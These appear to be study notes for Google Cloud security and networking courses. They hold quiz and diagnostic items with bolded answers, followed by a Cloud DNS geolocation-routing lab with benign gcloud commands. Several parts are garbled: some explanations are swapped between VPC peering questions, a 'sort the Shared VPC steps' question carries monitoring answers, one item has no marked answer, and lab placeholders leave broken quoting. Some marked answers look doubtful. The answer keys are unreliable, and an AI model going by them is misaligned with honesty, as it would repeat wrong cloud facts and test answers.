- Stop the Compute Engine instance. Set up Measured Boot for secure boot. Prepare a cloudbuild.yaml configuration file. Specify the persistent disk location of the Compute Engine instance and the ‘development’ group. Use the command gcloud builds submit --tag, and specify the configuration file path.

4. Cymbal Bank has suffered a remote botnet attack on Compute Engine instances in an isolated project. The affected project now requires investigation by an external agency. An external agency requests that you provide all admin and system events to analyze in their local forensics tool. You want to use the most cost-effective solution to enable the external analysis. What should you do?

- Use Cloud Monitoring and Cloud Logging. Filter Cloud Monitoring to view only system and admin logs. Expand the system and admin logs in Cloud Logging. Use Pub/Sub to export the findings from Cloud Logging to the external agency’s forensics tool or storage.

- Use Event Threat Detection. Trigger the IAM Anomalous Grant detector to detect all admins and users with admin or system permissions. Export these logs to the Security Command Center. Give the external agency access to the Security Command Center.

- **Use Cloud Audit Logs. Filter Admin Activity audit logs for only the affected project. Use a Pub/Sub topic to stream the logs from Cloud Audit Logs to the external agency’s forensics tool.**

- Use the Security Command Center. Select Cloud Logging as the source, and filter by category: Admin Activity and category: System Activity. View the Source property of the Finding Details section. Use Pub/Sub topics to export the findings to the external agency’s forensics tool.

5. Set an organization-level policy that  requires all Compute Engine VMs to be configured as Shielded VMs. Use  Measured Boot enabled with Virtual Trusted Platform Module (vTPM).  Validate integrity events in Cloud Monitoring and place alerts on late  boot validation events.

- Set an organization-level policy that requires all Compute Engine VMs to be configured as Shielded VMs. Use Secure Boot enabled with Unified Extensible Firmware Interface (UEFI). Validate integrity events in Cloud Monitoring and place alerts on launch attestation events.

- **Set an organization-level policy that requires all Compute Engine VMs to be configured as Shielded VMs. Use Measured Boot enabled with Virtual Trusted Platform Module (vTPM). Validate integrity events in Cloud Monitoring and place alerts on late boot validation events.**

- Set Cloud Logging measurement policies on the VMs. Use Cloud Logging to place alerts whenever actualMeasurements and policyMeasurements don’t match.

- Set project-level policies that require all Compute Engine VMs to be configured as Shielded VMs. Use Measured Boot enabled with Virtual Trusted Platform Module (vTPM). Validate integrity events in Cloud Monitoring and place alerts on late boot validation events.

6. Cymbal Bank has Docker applications deployed in Google Kubernetes Engine. The bank has no offline containers. This GKE cluster is exposed to the public internet and has recently recovered from an attack. Cymbal Bank suspects that someone in the organization changed the firewall rules and has tasked you to analyze and find all details related to the firewall for the cluster. You want the most cost-effective solution for this task. What should you do?

- **View the GKE logs in Cloud Logging. Use the log scoping tool to filter the Firewall Rules log. Create a dataset in BigQuery to accept the logs. Export the logs to BigQuery using the command gcloud logging sinks create. Query this dataset.**

- View the GKE logs in the local GKE cluster. Use the kubectl Sysdig Capture tool to filter the Firewall Rules log. Create a Pub/Sub topic. Export these logs to a Pub/Sub topic using the GKE cluster. Use Dataflow to read from Pub/Sub and query the stream.

- View the GKE logs in the local GKE cluster. Use Docker-explorer to explore the Docker file system. Filter and export the Firewall logs to Cloud Logging. Create a dataset in BigQuery to accept the logs. Use the command gcloud logging sinks create to export the logs to a BigQuery dataset. Query this dataset.

- View the GKE logs in Cloud Logging. Use the log scoping tool to filter the Firewall Rules log. Create a Pub/Sub topic. Export the logs to a Pub/Sub topic using the command gcloud logging sinks create. Use Dataflow to read from Pub/Sub and query the stream.

7. Cymbal Bank has received Docker source files from its third-party developers in an Artifact Registry repository. These Docker files will be part of a CI/CD pipeline to update Cymbal Bank’s personal loan offering. The bank wants to prevent the possibility of remote users arbitrarily using the Docker files to run any code. You have been tasked with using Container Analysis’ On-Demand scanning to scan the images for a one-time update. What should you do?

- **Prepare a cloudbuild.yaml file. In this file, add four steps in order—build, scan, severity check, and push—specifying the location of Artifact Registry repository. Specify severity level as CRITICAL. Start the build with the command gcloud builds submit.**

- Prepare a cloudbuild.yaml file. In this file, add four steps in order—scan, severity check, build, and—push specifying the location of the Artifact Registry repository. Specify severity level as HIGH. Start the build with the command gcloud builds submit.

- Prepare a cloudbuild.yaml file. In this file, add four steps in order—scan, build, severity check, and push—specifying the location of the Artifact Registry repository. Specify severity level as HIGH. Start the build with the command gcloud builds submit.

- Prepare a cloudbuild.yaml file. In this file, add four steps in order—build, severity check, scan, and push—specifying the location of the Artifact Registry repository. Specify severity level as CRITICAL. Start the build with the command gcloud builds submit.

8. Cymbal Bank experienced a recent security issue. A rogue employee with admin permissions for Compute Engine assigned existing Compute Engine users some arbitrary permissions. You are tasked with finding all these arbitrary permissions. What should you do to find these permissions most efficiently?

- Use Event Threat Detection and trigger the IAM Anomalous Grant detector. Publish results to Cloud Logging. In the Security Command Center, select Cloud Logging as the source, filter by category: anomalies, and sort to find the attack time window. Click on Persistence: IAM Anomalous Grant to display Finding Details. View the Source property of the Finding Details section.

- Use Event Threat Detection and configure Continuous Exports to filter and write only Firewall logs to the Security Command Center. In the Security Command Center, select Event Threat Detection as the source, filter by category: anomalies, and sort to find the attack time window. Click on Evasion: IAM Anomalous Grant to display Finding Details. View the Source property of the Finding Details section.

- **Use Event Threat Detection and trigger the IAM Anomalous grants detector. Publish results to the Security Command Center. In the Security Command Center, select Event Threat Detection as the source, filter by category: iam, and sort to find the attack time window. Click on Persistence: IAM Anomalous Grant to display Finding Details. View the Source property of the Finding Details section.**

- Use Event Threat Detection and configure Continuous Exports to filter and write only Firewall logs to the Security Command Center. In the Security Command Center, select Event Threat Detection as the source, filter by evasion: Iam, and sort to find the attack time window. Click on Persistence: IAM Anomalous Grant to display Finding Details. View the Source property of the Finding Details section.

9. Cymbal Bank wants to use Cloud Storage and BigQuery to store safe deposit usage data. Cymbal Bank needs a cost-effective approach to auditing only Cloud Storage and BigQuery data access activities. How would you use Cloud Audit Logs to enable this analysis?

- Enable Data Access Logs for ADMIN_READ, DATA_READ, and DATA_WRITE at the service level for BigQuery and Cloud Storage.

- Enable Data Access Logs for ADMIN_READ, DATA_READ, and DATA_WRITE at the organization level.

- Enable Data Access Logs for ADMIN_READ, DATA_READ, and DATA_WRITE for BigQuery. All Data Access Logs are enabled for Cloud Storage by default.

- **Enable Data Access Logs for ADMIN_READ, DATA_READ, and DATA_WRITE for Cloud Storage. All Data Access Logs are enabled for BigQuery by default.**

10. Cymbal Bank uses Compute Engine instances for its APIs, and recently discovered bitcoin mining activities on some instances. The bank wants to detect all future mining attempts and notify the security team. The security team can view the Security Command Center and Cloud Audit Logs. How should you configure the detection and notification?

- Enable the VM Manager tools suite in the Security Command Center. Perform a scan of Compute Engine instances. Publish results to Cloud Audit Logging. Create an alert in Cloud Monitoring to send notifications of suspect activities.

- Enable the Web Security Scanner in the Security Command Center. Perform a scan of Compute Engine instances. Publish results to Cloud Audit Logging. Create an alert in Cloud Monitoring to send notifications for suspect activities.

- Use Event Threat Detection’s threat detectors. Export findings from ‘Suspicious account activity’ and ‘Anomalous IAM behavior’ detectors and publish them to a Pub/Sub topic. Create a Cloud Run function to send notifications of suspect activities. Use Pub/Sub notifications to invoke the Cloud Run function.

- **Enable Anomaly Detection in the Security Command Center. Create and configure a Pub/Sub topic and an email service. Create a Cloud Run function to send email notifications for suspect activities. Export findings to a Pub/Sub topic, and use them to invoke the Cloud Run function.**

### Knowledge Check

1. Which feature of Google Cloud will Cymbal Bank use to prevent unauthorized container images from being deployed into production environments?

- Cloud Build
- **Binary Authorization**
- Cloud Monitoring
- Audit logs

Correct. Binary Authorization provides a system for applying  attestations to container images to prevent unauthorized container  images from being deployed into infrastructure.

2. How will Cymbal Bank be able to determine who performed a particular administrative action and when?
- Cloud Monitoring
- **Audit logs**
- VPC service controls
- VPC flow logs

Correct. Audit logs include a capture of all administrative actions,  including the identity making the request and when it occurred.



## Supporting Compliance Requirements

### Diagnostic questions

1. Cymbal Bank’s Insurance Analyst needs to collect and store anonymous protected health information of patients from various hospitals. The information is currently stored in Cloud Storage, where each hospital has a folder that contains its own bucket. You have been tasked with collecting and storing the healthcare data from these buckets into Cymbal Bank’s Cloud Storage bucket while maintaining HIPAA compliance. What should you do?

- **Use the Cloud Healthcare API to read the data from the hospital buckets and use de-identification to redact the sensitive information. Use Dataflow to ingest the Cloud Healthcare API feed and write data in a new Project that contains the Cloud Storage bucket. Give the Insurance Analyst the ‘Editor’ role on this Project.**

- Create a new folder. Create a new Cloud Storage bucket in this folder. Give the Insurance Analyst the ‘Editor’ role on the new folder. Collect all hospital data in this bucket. Use the Google Cloud Healthcare Data Protection Toolkit to monitor this bucket.

- Create a new Project. Use the Google Cloud Healthcare Data Protection Toolkit to set up a collection bucket, monitoring alerts, audit log sinks, and Forseti monitoring resources. Use Dataflow to read the data from source buckets and write to the new collection buckets. Give the Insurance Analyst the ‘Editor’ role on the collection bucket.

- Create a new Project. Create a new Cloud Storage bucket in this Project with customer-supplied encryption keys (CSEK). Give the Insurance Analyst the ‘Reader’ role on the Project that contains the Cloud Storage bucket. Use the DLP API to find and mask personally identifiable information (PII) data to comply with HIPAA.

2. You are a cloud engineer at Cymbal Bank. You need to share the auditing and compliance standards with your CTO that cover controls over financial reporting and both public and private controls over security, availability, and confidentiality. Which compliance standard covers this?

- **SOX**

- FIPs 140-2

- GDPR

- PCI-DSS

3. Cymbal Bank plans to launch a new public website where customers can pay their equated monthly installments (EMI) using credit cards. You need to build a secure payment processing solution using Google Cloud which should follow the PCI-DSS isolation requirements. How would you architect a secure payment processing environment with Google Cloud services to follow PCI-DSS? (Select the two correct choices)

- Deploy an Ubuntu Compute Engine instance. Install the libraries needed for payment solutions and encryption/decryption. Deploy using Terraform.

- Create a new Google Cloud project with restricted access (separate from production environment) for the payment processing solution. Create a new Compute Engine instance and configure firewall rules, a VPN tunnel, and an internal load balancer.

- Create a new Google Cloud project with restricted access (separate from production environment) for the payment processing solution. Configure firewall rules, a VPN tunnel, and a proxy Network Load Balancer for a new App Engine flexible environment.

- **Deploy a Linux base image from preconfigured operating system images. Install only the libraries you need. Deploy using Terraform.**

- **Create a new Google Cloud project with restricted access (separate from production environment) for the payment processing solution. Configure firewall rules, a VPN tunnel, and an Application Load Balancer for a new Compute Engine instance.**

4. You are designing a web application for Cymbal Bank so that customers who have credit card issues can contact dedicated support agents. Customers may enter their complete credit card number when chatting with or emailing support agents. You want to ensure compliance with PCI-DSS and prevent support agents from viewing this information in the most cost-effective way. What should you do?

- Implement Cloud Data Loss Prevention using its REST API.

- Detect sensitive information with Cloud Natural Language API.

- Use customer-managed encryption keys (CMEK) and Cloud Key Management Service (KMS) to detect and encrypt sensitive information.

- Use customer-supplied encryption keys (CSEK) and Cloud Key Management Service (KMS) to detect and encrypt sensitive information.

5. Cymbal Bank’s lending department stores sensitive information, such as your customers’ credit history, address and phone number, in parquet files. You need to upload this personally identifiable information (PII) to Cloud Storage so that it’s secure and compliant with ISO 27018. How should you protect this sensitive information using Cymbal Bank’s encryption keys and using the least amount of computational resources?

- Generate a customer-managed encryption key (CMEK) using Cloud KMS. Decode it as a base-64 string. Upload the blob to the bucket using this key.

- Generate an RSA key as a 32-byte bytestring. Decode it as a base-64 string. Upload the blob to the bucket using this key.

- Generate a customer-managed encryption key (CMEK) using RSA or AES256 encryption. Decode it as a base-64 string. Upload the blob to the bucket using this key.

- **Generate an AES-256 key as a 32-byte bytestring. Decode it as a base-64 string. Upload the blob to the bucket using this key.**

### Knowledge Check

1. Cymbal Bank has a compliance requirement to have control over key lifecycle and rotation periods. Which Google Cloud feature can they leverage to satisfy that requirement?
- **CMEK with Cloud KMS**
- VPC service controls
- Audit logs
- PCI-DSS compliance

Correct. CMEK with Cloud KMS provides the ability to set key rotation  and lifecycle configuration and select which keys are used for which  data.

2. Cymbal Bank has compliance requirements to ensure certain data is stored, processed, and never transferred or used outside of Europe. Which Google Cloud feature can help them achieve this?
- Audit logs
- **VPC service controls**
- Organization policy constraints
- Sensitive Data Protection

Correct! VPC service controls can be used to restrict access to data to  specific VPCs with subnets in specific regions, and can thereby  facilitate data residency and location-based access requirements.



# 03 Networking in Google Cloud: Fundamentals



## VPC Networking Fundamentals

### Quiz

1. You want to lower cloud networking cost and have no problem leveraging the public internet for cross-region traffic. Which network service tier is best for you?

-  Pro version 
-  Premium tier
-  **Standard tier**
-  Prime tier 
Correct! Most cost-effective, suitable for cost-conscious users willing to use public internet routing.

2. You want to improve network performance. You are not comfortable using the public internet to route traffic. Which service tier is the best fit?
-  Pro version 
-  **Premium tier**
-  Standard tier
-  Prime tier
Correct! Premium Tier improves performance and leverages the Google network
3. You are designing a virtual machine in the cloud to act as a network gateway between an external public network and a private internal network. To ensure strong security and traffic separation, what technology can you implement?
- **Multiple Network Interface Cards (NICs)**
- Cloud VPN
- VLAN tagging within a single NIC
- Premium Tier IPs
Correct! Multiple NICs attached to separate VPC networks achieve the strongest traffic isolation and control for the gateway scenario.

## Sharing VPC Networks

### Quiz

1. Which of the following statements about VPC Network Peering is correct?
- **Transitive peering is not supported.**
- Peered VPC networks do not remain administratively separate.
- Subnet IP ranges can overlap across peered VPC networks.
- Both sides of a peering association are set up in one single step.

This is correct. Shared VPC allows multiple projects to share a common  VPC network, with a centralized host project managing the network  resources.

2. How does VPC Peering exchange routing information between two peered VPCs?
- It relies on the default route table to forward traffic between the VPCs.
- **It automatically discovers and propagates routes through the Google Cloud Router.**
- It uses Border Gateway Protocol (BGP) to dynamically exchange routes.
- It requires manual configuration of static routes in each VPC's route table.

Correct. VPC Peering automatically propagates custom dynamic routes  through the Google Cloud Router, allowing each VPC to learn the routes  of the other peered VPC.

3. Which of the following approaches to multi-project networking uses a centralized network administration model?
- Cloud VPN
- Cloud VPN and Shared VPC
- VPC Network Peering
- **Shared VPC**

This statement is correct. VPC Network Peering establishes a direct  connection between two VPC networks, but it does not extend to other VPC networks they might be peered with.



## Network Monitoring and Logging

### Quiz

1. Sort the following steps for provisioning Shared VPC in Google Cloud:
- **Uptime checks**
- Dashboards
- Ops Agent
- **Alerting policies**

Correct! Alerting policies can email you when your web server cannot be reached.

Correct! Uptime checks test the availability of your web server and allow you to specify alerting policies.

2. In regards to VPC Flow Logs, which of the following statements is correct?
- **Logs can be used for network monitoring, forensics, real-time security analysis, and expense optimization.**
- Logs cannot be analyzed in BigQuery or visualized in Looker Studio.
- Log updates are provided every 5 minutes.
- There is a delay and performance penalty in routing logged IP packets.

Correct! VPC Flow Logs can be used for network monitoring, forensics, real-time security analysis, and expense optimization.



# 04 Networking in Google Cloud: Routing and Addressing

## Network Routing and Addressing in Google Cloud

### Lab - Cloud DNS - Traffic Steering using Geolocation Policy

#### Overview

Cloud DNS routing policies enable users to configure DNS based traffic steering. A user can either create a Weighted Round Robin (WRR) routing policy or a Geolocation (GEO) routing policy. You can configure routing policies by creating special ResourceRecordSets with special routing policy values.

Use WRR to specify different weights per ResourceRecordSet for the resolution of domain names. Cloud DNS routing policies help ensure that traffic is distributed across multiple IP addresses by resolving DNS requests according to the configured weights.

In this lab, you will configure and test the Geolocation routing policy. Use GEO to specify source geolocations and to provide DNS answers corresponding to those geographies. The geolocation routing policy applies the nearest match for the source location when the traffic source location doesn't match any policy items exactly.

#### What you learn

You will learn how to:

1. Launch client VMs, one in each region
2. Launch server VMs, one in each region except asia-south1
3. Create a private zone, for `example.com`
4. Create a Geolocation routing policy using gcloud commands
5. Test the configuration

#### Architecture

Use the default VPC network to create all the virtual machines (VM) and launch client VMs in 3 Google Cloud locations: one in the United States, another in Europe, and another in Asia. To demonstrate the Geolocation routing policy behavior, you will create the server VMs only in two of those location - in the United States and in Europe. The archirtecture will look similar to what is shown in the graphic. (Note that the actual regions and zones within the United States and Europe may differ from those shown in the graphic.)

![The default VPC diagram](images/8%2FlpClCM%2F6jdXaT35cMC8lQWcc0iS3OGAF5HIJVybTs%3D.png)

You will use Cloud DNS routing policies and create `ResourceRecordSets` for geo.example.com and configure the Geolocation policy to help ensure that a client request is routed to a server in the client's closest region.

![The Cloud DNS routing policies diagram](images/QnzO9JhP8FDiTfp5TELBXyKXmav7zf0Hyhds0gqrTgw%3D.png)

#### Setup and requirements

#### Before you click the Start Lab button

**Note: Read these instructions.**



Labs are timed and you cannot pause them. The timer, which starts when you click **Start Lab**, shows how long Google Cloud resources will be made available to you.

This Qwiklabs hands-on lab lets you do the lab activities yourself in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials that you use to sign in and access Google Cloud for the duration of the lab.

#### What you need

To complete this lab, you need:

- Access to a standard internet browser (Chrome browser recommended).
- Time to complete the lab.

**Note:** If you already have your own personal Google Cloud account or project, do not use it for this lab.

**Note:** If you are using a Pixelbook, open an Incognito window to run this lab.

#### How to start your lab and sign in to the Console

1. Click the **Start Lab** button. If you need to pay for the lab, a pop-up opens for you to select your payment method. On the left is a panel populated with the temporary credentials that you must use for this lab.

   ![Credentials panel](images/%2FtHp4GI5VSDyTtdqi3qDFtevuY014F88%2BFow%2FadnRgE%3D.png)

2. Copy the username, and then click **Open Google Console**. The lab spins up resources, and then opens another tab that shows the **Choose an account** page.

   **Note:** Open the tabs in separate windows, side-by-side.

3. On the Choose an account page, click **Use Another Account**. The Sign in page opens.

   ![Choose an account dialog box with Use Another Account option highlighted ](images/eQ6xPnPn13GjiJP3RWlHWwiMjhooHxTNvzfg1AL2WPw%3D.png)

4. Paste the username that you copied from the Connection Details panel. Then copy and paste the password.

**Note:** You must use the credentials from the Connection Details panel. Do not use your Google Cloud Skills Boost credentials. If you have your own Google Cloud account, do not use it for this lab (avoids incurring charges).

1. Click through the subsequent pages:

- Accept the terms and conditions.
- Do not add recovery options or two-factor authentication (because this is a temporary account).
- Do not sign up for free trials.

After a few moments, the Cloud console opens in this tab.

**Note:** You can view the menu with a list of Google Cloud Products and Services by clicking the **Navigation menu** at the top-left.![Cloud Console Menu](images/9vT7xPlxoNP%2FPsK0J8j0ZPFB4HnnpaIJVCDByaBrSHg%3D.png)

#### Activate Google Cloud Shell

Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.

Google Cloud Shell provides command-line access to your Google Cloud resources.

1. In Cloud console, on the top right toolbar, click the Open Cloud Shell button.

   ![Highlighted Cloud Shell icon](images/WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D.png)

2. Click **Continue**.

It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your *PROJECT_ID*. For example:

![Project ID highlighted in the Cloud Shell Terminal](images/hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D.png)

**gcloud** is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.

- You can list the active account name with this command:

```
gcloud auth list
```



**Output:**

```
Credentialed accounts:
 - @.com (active)
```

**Example output:**

```
Credentialed accounts:
 - google1623327_student@qwiklabs.net
```

- You can list the project ID with this command:

```
gcloud config list project
```



**Output:**

```
[core]
project = 
```

**Example output:**

```
[core]
project = qwiklabs-gcp-44776a13dea667a6
```

**Note:** Full documentation of **gcloud** is available in the [gcloud CLI overview guide ](https://cloud.google.com/sdk/gcloud).

#### Task 1. Enable APIs

Ensure that the Compute and the Cloud DNS APIs are enabled. In this section, you will enable the APIs manually, using `gcloud` commands.

#### Enable Compute Engine API

- Run the `gcloud services enable` command to enable the Compute Engine API:

```
gcloud services enable compute.googleapis.com
```



This command can take a few minutes to complete.

#### Enable Cloud DNS API

- Run the `gcloud services enable` command to enable the Cloud DNS API:

```
gcloud services enable dns.googleapis.com
```



This command can take a few minutes to complete.

#### Verify that the APIs are enabled

- Run the `gcloud services list` command to list all the enabled APIs. We should see `compute.googleapis.com` and `dns.googleapis.com` in the listed output.

```
gcloud services list | grep -E 'compute|dns'
```



**Output:**

```
NAME: compute.googleapis.com
NAME: dns.googleapis.com
```

#### Task 2. Configure the firewall

Before you create the client VMs and the web servers, you need to create two firewall rules.

**Note:** The `firewall-rules create` command can take a few minutes to complete. Please wait for the "Creating firewall...done" message before proceeding to the next step.

1. To be able to SSH into the client VMs, run the following to create a firewall rule to allow SSH traffic from Identity Aware Proxies (IAP):

```
gcloud compute firewall-rules create fw-default-iapproxy \
--direction=INGRESS \
--priority=1000 \
--network=default \
--action=ALLOW \
--rules=tcp:22,icmp \
--source-ranges=35.235.240.0/20
```



**Output:**

```
Creating firewall...working..Created [https://www.googleapis.com/compute/v1/projects/qwiklabs-gcp-01-c5d669dffb06/global/firewalls/fw-default-iapproxy].
Creating firewall...done.
NAME: fw-default-iapproxy
NETWORK: default
DIRECTION: INGRESS
PRIORITY: 1000
ALLOW: tcp:22,icmp
DENY:
DISABLED: False
```

1. To allow HTTP traffic on the web servers, each web server will have a "http-server" tag associated with it. You will use this tag to apply the firewall rule only to your web servers:

```
gcloud compute firewall-rules create allow-http-traffic --direction=INGRESS --priority=1000 --network=default --action=ALLOW --rules=tcp:80 --source-ranges=0.0.0.0/0 --target-tags=http-server
```



**Output:**

```
Creating firewall...working..Created [https://www.googleapis.com/compute/v1/projects/routing-policy-lab/global/firewalls/allow-http-traffic].
Creating firewall...done.
NAME: allow-http-traffic
NETWORK: default
DIRECTION: INGRESS
PRIORITY: 1000
ALLOW: tcp:80
DENY:
DISABLED: False
```

Click *Check my progress* to verify the objective.

Configure the Firewall



#### Task 3. Launch client VMs

Now that the APIs are enabled, and the firewall rules are in place, the next step is to set up the environment. In this section, you will create 3 client VMs, one in each region.

#### Launch a client in the United States

- Run the `gcloud compute instances create` command to create the client VMs:

```
gcloud compute instances create us-client-vm --machine-type=e2-micro --zone "Zone 1"
```



This command can take a few minutes to complete. Please wait for a "Created" message before moving to the next step. Note that you may see a different zone in gcloud than in the sample output shown below.

**Output:**

```
Created [https://www.googleapis.com/compute/v1/projects/routing-policy-lab/zones/us-east1-b/instances/us-client-vm].
NAME: us-client-vm
ZONE: "Zone 1"
MACHINE_TYPE: e2-micro
PREEMPTIBLE:
INTERNAL_IP: 10.142.0.2
EXTERNAL_IP: 34.138.90.216
STATUS: RUNNING
```

#### Launch a client in Europe

- Run the following to create the client VMs:

```
gcloud compute instances create europe-client-vm --machine-type=e2-micro --zone ""Zone 2""
```



Note that you may see a different zone in gcloud than in the sample output shown below.

**Output:**

```
Created [https://www.googleapis.com/compute/v1/projects/routing-policy-lab/zones/europe-west2-a/instances/europe-client-vm].
NAME: europe-client-vm
ZONE: "Zone 2"
MACHINE_TYPE: e2-micro
PREEMPTIBLE:
INTERNAL_IP: 10.154.0.2
EXTERNAL_IP: 35.242.164.177
STATUS: RUNNING
```

#### Launch a client in Asia

1. Run the following to create the client VMs:

```
gcloud compute instances create asia-client-vm --machine-type=e2-micro --zone ""Zone 3""
```



Note that you may see a different zone in gcloud than in the sample output shown below.

**Output:**

```
Created [https://www.googleapis.com/compute/v1/projects/routing-policy-lab/zones/asia-south1-a/instances/asia-client-vm].
NAME: asia-client-vm
ZONE: "Zone 3"
MACHINE_TYPE: e2-micro
PREEMPTIBLE:
INTERNAL_IP: 10.160.0.2
EXTERNAL_IP: 34.93.179.212
STATUS: RUNNING
```

Click *Check my progress* to verify the objective.

Launch client VMs



#### Task 4. Launch Server VMs

Now that the client VM's are up and running, the next step is to create the server VMs. You will use a startup script to configure and set up the web servers. As mentioned earlier, you will create the server VMs only in 2 regions: us-east1 and europe-west2.

- Run the `gcloud compute instances create` command to create the server VMs. The compute instance create command can take a few minutes to complete. Please wait for a "Created" message before moving to the next step.

#### Launch server in the United States

- Run the following command:

```
gcloud compute instances create us-web-vm \
--machine-type=e2-micro \
--zone="Zone 1" \
--network=default \
--subnet=default \
--tags=http-server \
--metadata=startup-script='#! /bin/bash
 apt-get update
 apt-get install apache2 -y
 echo "Page served from: "Region 1"" | \
 tee /var/www/html/index.html
 systemctl restart apache2'
```



Note that you may see a different zone in gcloud than in the sample output shown below.

**Output:**

```
Created [https://www.googleapis.com/compute/v1/projects/routing-policy-lab/zones/us-east1-b/instances/us-web-vm].
NAME: us-web-vm
ZONE: "Zone 1"
MACHINE_TYPE: e2-micro
PREEMPTIBLE:
INTERNAL_IP: 10.142.0.3
EXTERNAL_IP: 34.73.110.151
STATUS: RUNNING
```

#### Launch server in Europe

- Run the following to command:

```
gcloud compute instances create europe-web-vm \
--machine-type=e2-micro \
--zone="Zone 2" \
--network=default \
--subnet=default \
--tags=http-server \
--metadata=startup-script='#! /bin/bash
 apt-get update
 apt-get install apache2 -y
 echo "Page served from: "Zone 2"" | \
 tee /var/www/html/index.html
 systemctl restart apache2'
```



Note that you may see a different zone in gcloud than in the sample output shown below.

**Output:**

```
Created [https://www.googleapis.com/compute/v1/projects/routing-policy-lab/zones/europe-west2-a/instances/europe-web-vm].
NAME: europe-web-vm
ZONE: "Zone 2"
MACHINE_TYPE: e2-micro
PREEMPTIBLE:
INTERNAL_IP: 10.154.0.3
EXTERNAL_IP: 35.234.156.62
STATUS: RUNNING
```

Click *Check my progress* to verify the objective.

Launch Server VMs



#### Task 5. Setting up environment variables

Before you configure Cloud DNS, note the Internal IP addresses of the web servers. You need these IPs to create the routing policy. In this section, you will use the `gcloud compute instances describe` command to save the internal IP addresses as environment variables.

1. Command to save IP address for the VM in the United States

```
export US_WEB_IP=$(gcloud compute instances describe us-web-vm --zone="Zone 1" --format="value(networkInterfaces.networkIP)")
```



1. Command to save the IP address for the VM in Europe:

```
export EUROPE_WEB_IP=$(gcloud compute instances describe europe-web-vm --zone="Zone 2" --format="value(networkInterfaces.networkIP)")
```



#### Task 6. Create the private zone

Now that your client and server VMs are running, it's time to configure the DNS settings. Before creating the A records for the web servers, you need to create the Cloud DNS Private Zone.

For this lab, use the `example.com` domain name for the Cloud DNS zone.

- Use the `gcloud dns managed-zones create` command to create the zone:

```
gcloud dns managed-zones create example --description=test --dns-name=example.com --networks=default --visibility=private
```



**Output:**

```
Created [https://dns.googleapis.com/dns/v1/projects/routing-policy-lab/managedZones/example].
```

#### Task 7. Create Cloud DNS Routing Policy

In this section, configure the Cloud DNS Geolocation Routing Policy. You will create a record set in the `example.com` zone that you created in the previous section.

##### Create

- Use the `gcloud dns record-sets create` command to create the geo.example.com recordset:

```
gcloud dns record-sets create geo.example.com \
--ttl=5 --type=A --zone=example \
--routing-policy-type=GEO \
--routing-policy-data=""Region 1"=$US_WEB_IP;"Region 2"=$EUROPE_WEB_IP"
```



You are creating an A record with a Time to Live (TTL) of 5 seconds. The policy type is GEO, and the `routing_policy_data` field accepts a semicolon-delimited list of the format `${region}:${rrdata},${rrdata}`.

**Output:**

```
NAME: geo.example.com.
TYPE: A
TTL: 5
DATA: "filled at lab start": 10.142.0.3; "Region 2": 10.154.0.3
```

##### Verify

- Use the `dns record-sets list` command to verify that the `geo.example.com`DNS record is configured as expected:

```
gcloud dns record-sets list --zone=example
```



The output shows that an A record with a TTL of 5 is created for `geo.example.com`, and the data matches our server set up in each region.

Note that in gcloud, the DATA value under geo.example.com may include United States and Europe regions that differ from the sample output below.

**Output:**

```
NAME: example.com.
TYPE: NS
TTL: 21600
DATA: ns-gcp-private.googledomains.com.

NAME: example.com.
TYPE: SOA
TTL: 21600
DATA: ns-gcp-private.googledomains.com. cloud-dns-hostmaster.google.com. 1 21600 3600 259200 300

NAME: geo.example.com.
TYPE: A
TTL: 5
DATA: "REGION": 10.142.0.3; "Region 2": 10.154.0.3
```

Click *Check my progress* to verify the objective.

Create the Private Zone



#### Task 8. Testing

It's time to test the configuration. In this section, you will SSH into all the client VMs. Since all of the web server VMs are behind the `geo.example.com` domain, you will use `CURL` command to access this endpoint.

Since you are using a Geolocation policy, the expected result is that:

- The client in the US should always get a response from the `<Zone 1` region.
- The client in Europe should always get a response from the `Zone 2` region.

##### Testing from the client VM in Europe

1. Use the `gcloud compute ssh` command to log into the client VM:

```
gcloud compute ssh europe-client-vm --zone "Zone 2" --tunnel-through-iap
```



1. Follow prompts to SSH into the machine. When asked to enter the passphrase, leave the field blank and press the Enter key twice.

Once complete, the command line should change to "`user_name@europe-client-vm:~$`"

**Output:**

```
Warning: Permanently added 'compute.4621780534809863836' (ECDSA) to the list of known hosts.
Linux europe-client-vm 4.19.0-18-cloud-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
user_name@europe-client-vm:~$
```

##### Use `curl` to access the web server

1. Now that you are in the client VM, use the `CURL` command to access the `geo.example.com` endpoint. The loop is configured to run the command ten times with a sleep timer of 6 seconds:

```
for i in {1..10}; do echo $i; curl geo.example.com; sleep 6; done
```



Since the TTL on the DNS record is set to 5 seconds, a sleep timer of 6 seconds has been added. The sleep timer will make sure that you get an uncached DNS response for each cURL request. This command will take approximately one minute to complete.

The expected output is "Page served from: `Zone 2`

```
1
Page served from: "Zone 2"
2
Page served from: "Zone 2"
3
Page served from: "Zone 2"
4
Page served from: "Zone 2"
5
Page served from: "Zone 2"
6
Page served from: "Zone 2"
7
Page served from: "Zone 2"
8
Page served from: "Zone 2"
9
Page served from: "Zone 2"
10
Page served from: "Zone 2"
```

1. Run this test multiple times and analyze the output to see which server is responding to the request. The client should always receive a response from a server in the client's region.

##### Getting back to Cloud Shell

- Once you have run the test multiple times, exit the client VM in Europe by typing "`exit`" in the VM's command prompt. This will bring you back to the Cloud Shell console.

##### Testing from the client VM in us-east1

Now perform the same test from the client VM in the US.

1. Use the `gcloud` command below to SSH into the us-client-vm:

```
gcloud compute ssh us-client-vm --zone "Zone 1" --tunnel-through-iap
```



1. Use the `curl` command to access `geo.example.com`:

```
for i in {1..10}; do echo $i; curl geo.example.com; sleep 6; done
```



1. Now analyze the output to see which server is responding to the request. The client should always receive a response from a server in the client's region. The expected output is "Page served from: `<filled at lab start>`".
2. Once you have run the test multiple times, exit the client VM in the US by typing "`exit`" in the VM's command prompt.

##### Testing from the client VM in Asia

